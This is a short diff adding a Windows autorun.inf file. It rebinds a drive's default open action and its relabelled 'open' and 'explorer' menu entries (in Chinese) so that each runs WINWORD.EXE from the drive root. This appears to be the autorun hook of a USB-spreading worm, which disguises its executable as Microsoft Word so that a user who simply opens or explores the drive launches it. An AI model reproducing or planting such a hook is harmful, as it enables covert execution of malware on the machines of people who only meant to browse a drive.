@@ -1,0 +1,7 @@
+[autorun]
+OPEN=WINWORD.EXE
+shell\open=打开(&O)
+shell\open\Command=WINWORD.EXE
+shell\open\Default=1
+shell\explorer=资源管理器(&X)
+shell\explorer\Command=WINWORD.EXE
